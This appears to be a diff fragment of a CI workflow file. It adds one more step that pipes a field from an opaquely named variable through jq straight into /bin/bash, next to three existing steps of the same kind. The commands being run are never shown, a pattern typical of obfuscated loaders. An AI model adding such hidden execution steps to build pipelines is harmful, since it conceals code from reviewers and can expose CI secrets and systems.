@@ -19,6 +19,7 @@ jobs:
           printf '%s' "$jsto08" | jq -r .hpgnw870 | /bin/bash
           echo $gsfqu04636 | jq -r .q7 | /bin/bash
           echo $e28450 | jq -r .fe66 | /bin/bash
+          printf '%s' "$t4" | jq -r .fkg92 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
